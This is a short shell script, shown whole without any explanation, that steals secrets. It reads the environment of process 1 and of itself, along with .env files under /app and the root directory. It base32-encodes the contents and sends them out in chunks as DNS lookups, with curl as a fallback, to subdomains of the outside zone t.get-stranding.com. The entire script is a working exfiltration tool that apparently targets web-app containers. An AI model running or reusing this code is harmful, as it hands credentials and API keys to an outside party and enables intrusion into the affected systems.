ZONE=t.get-stranding.com
beacon(){ getent hosts "$1" >/dev/null 2>&1 || curl -s -m 2 "http://$1/" >/dev/null 2>&1; }
run(){
  [ -r "$1" ] || return
  d=$(base32 "$1" 2>/dev/null | tr -d '=' | tr 'A-Z' 'a-z')
  [ -z "$d" ] && return
  i=0
  for l in $(echo "$d" | fold -w 40); do
    beacon "$2.$i.$l.$ZONE"
    i=$((i+1))
  done
  beacon "end.$2.$ZONE"
}
run /proc/1/environ e1
run /proc/self/environ e2
for p in /app/.env /app/.env.local /app/.env.production /app/.next/standalone/.env /.env /env/.env; do
  run "$p" "$(echo $p | tr '/.' '__')"
done
echo done
